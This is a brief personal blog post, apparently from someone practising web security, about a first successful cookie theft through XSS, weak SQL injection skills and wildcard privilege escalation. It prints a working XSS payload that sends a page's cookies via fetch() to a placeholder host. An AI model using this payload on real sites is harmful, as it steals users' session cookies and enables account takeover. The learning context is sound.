@@ -1,0 +1,26 @@
+
+#+STARTUP: showall indent
+#+STARTUP: hidestars
+#+OPTIONS: num:nil toc:nil
+#+BEGIN_EXPORT html
+---
+title:  Stealing all the Cookies...
+categories:
+  - blog
+tags:
+    - SQLi
+    - XSS
+---
+#+END_EXPORT
+
+So today I stoal my first cookies... yeah, this is something I need to remember:
+
+~<script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>~
+
+Nevertheles I was directly humbled afterwards as I have seen that the SQLi basics are definetly not that good on my side and that
+without SQLmap I'm quite helpless.
+
+Furthermore I discoverd that even wildcards can be quite dangerous in script
+Unbeliveable what you have to avoid :)
+
+https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
